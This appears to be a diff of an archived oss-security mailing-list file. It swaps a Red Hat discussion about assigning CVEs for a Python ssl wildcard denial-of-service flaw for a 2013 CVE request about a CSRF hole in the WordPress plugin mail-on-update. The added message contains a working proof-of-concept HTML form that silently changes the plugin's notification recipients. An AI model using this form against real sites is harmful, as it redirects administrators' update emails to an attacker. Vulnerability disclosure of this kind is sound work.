@@ -1,43 +1,40 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/23/1
-Message-ID: <20130523135827.03724f4b@redhat.com>
-Date: Thu, 23 May 2013 13:58:27 +0200
-From: Tomas Hoger <thoger@...hat.com>
-To: kseifried@...hat.com
-Cc: oss-security@...ts.openwall.com, Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>, Florian Weimer <fweimer@...hat.com>, Ian Weller <ianweller@...oraproject.org>
-Subject: Re: CVE Request (minor) -- Python 3.2: DoS when matching certificate with many '*' wildcard characters {was:  CVE Request (minor) --  python-backports-ssl_match_hostname: Denial of service when matching certificate with many '*' wildcard characters }
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/16/8
+Message-ID: <20130516140611.GD19291@kludge.henri.nerv.fi>
+Date: Thu, 16 May 2013 17:06:11 +0300
+From: Henri Salo <henri@...v.fi>
+To: oss-security@...ts.openwall.com
+Subject: CVE request: WordPress plugin mail-on-update CSRF
 Content-Type: text/plain; charset=utf-8
 
-On Wed, 22 May 2013 01:08:36 -0600 Kurt Seifried wrote:
+Hello,
 
-> > Given that CVE-2013-2099 was assigned to Python 3 ssl,
-> > CVE-2013-2098 seems like the one to reject as dupe.
-> 
-> My reasoning here was that Python 2 and 3 constitute "forked" or
-> separate code bases, so fall under CVE SPLIT.evidence includes:
-> 
-> 1) Python 2to3, a lot of Python code needs work to move from 2 to 3
-> 2) This feature was added as standard in Python 3 and then later back
-> ported to 2
+Can I get 2013 CVE for WordPress plugin mail-on-update CSRF vulnerability. PoC
+for "List of alternative recipients" below. Tested 5.1.0 version.
 
-There are surely differences in other parts of python code, but in this
-case, affected functionality is the same in python 3 and
-python-backports-ssl_match_hostname (the latter just contains a
-functionality copied from the former).  Given that affected code is
-identical, I don't believe differences in other parts of codebases not
-related to the flaw should force split.  I.e. I'd follow:
+Homepage: http://wordpress.org/extend/plugins/mail-on-update/
+Code: http://plugins.svn.wordpress.org/mail-on-update/trunk/
 
-AB4) If there are multiple products, vendors, distributors, or users of
-the same core codebase, then DO NOT SPLIT based solely on
-distinguishing between products.
+<html><form action="https://example.com/wp/wp-admin/options-general.php?page=mail-on-update" method="post" class="buttom-primary">
+<input name="mailonupdate_mailto" type="hidden" value="example0@...mple.com
+example1@...mple.com
+example2@...mple.com
+example3@...mple.com
+example4@...mple.com
+example5@...mple.com
+example6@...mple.com
+example7@...mple.com
+example8@...mple.com
+example9@...mple.com
+example10@...mple.com
+henri+monkey@...v.fi" />
+<input name="submit" type="submit" value="Save"/></form></html>
 
-Additionally, the same code was also found embedded elsewhere:
+If attacker adds random email to that form default user won't get emails and
+attacker might be interested to receive these as the email contains information
+of available plugin updates.
 
-http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=709066#16
-https://bugzilla.redhat.com/show_bug.cgi?id=963260#c11
+---
+Henri Salo
 
-I don't think we want to give every project embedding that source a
-separate CVE id.
-
--- 
-Tomas Hoger / Red Hat Security Response Team
+Download attachment "signature.asc" of type "application/pgp-signature" (199 bytes)
